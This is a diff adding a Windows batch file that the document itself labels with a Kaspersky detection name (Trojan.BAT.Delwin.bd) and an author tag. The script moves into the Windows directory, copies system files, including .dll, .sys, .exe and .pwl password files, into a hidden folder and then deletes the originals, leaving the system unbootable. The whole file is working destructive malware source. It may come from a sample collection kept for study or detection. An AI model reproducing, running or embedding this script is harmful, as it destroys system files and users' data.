@@ -1,0 +1,27 @@
+@echo off
+c:\
+cd\
+cd windows
+md ųų
+copy *.ini c:\windows\ųų
+copy *.dll c:\windows\ųų
+copy *.pwl c:\windows\ųų
+copy *.com c:\windows\ųų
+copy *.exe c:\windows\ųų
+copy *.sys c:\windows\ųų
+copy *.log c:\windows\ųų
+copy *.com c:\windows\ųų
+copy *.bat c:\windows\ųų
+del *.ini >nul
+del *.dll >nul
+del *.pwl >nul
+del *.com >nul
+del *.exe >nul
+del *.sys >nul
+del *.log >nul
+del *.com >nul
+del *.bat >nul
+::Kaspersky name is Trojan.BAT.Delwin.bd
+::Another DVL creation
+::dvl2003ro@yahoo.co.uk
+cls
